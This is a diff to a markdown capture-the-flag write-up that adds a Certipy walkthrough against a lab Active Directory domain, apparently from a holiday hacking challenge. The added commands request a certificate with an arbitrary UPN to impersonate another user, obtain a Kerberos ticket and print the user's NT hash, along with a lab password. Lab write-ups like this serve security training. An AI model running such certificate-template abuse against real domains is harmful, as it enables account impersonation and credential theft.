@@ -224,10 +224,33 @@ alabaster@ssh-server-vm:~/impacket$ cat 20231210143907_Certipy.json
   }
 }
 ```
-So we can request a certificate for any user with 
+So we can request a certificate for any user.
+
+```
+alabaster@ssh-server-vm:~/impacket$ ./certipy req -username elfy@northpole.local -password 'J4`ufC49/J4766' -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers -upn wombleycube@northpole.local
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[!] Failed to resolve: NORTHPOLE.LOCAL
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 54
+[*] Got certificate with UPN 'wombleycube@northpole.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'wombleycube.pfx'
+alabaster@ssh-server-vm:~/impacket$ certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: wombleycube@northpole.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'wombleycube.ccache'
+[*] Trying to retrieve NT hash for 'wombleycube'
+[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
+
+```
 
 **Achievement: Ipsum**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbOTI5ODY2NDMxLDEwODc4NTMxNDcsLTIwMT
+eyJoaXN0b3J5IjpbOTMxODkwMTk2LDEwODc4NTMxNDcsLTIwMT
 AxOTI2M119
 -->
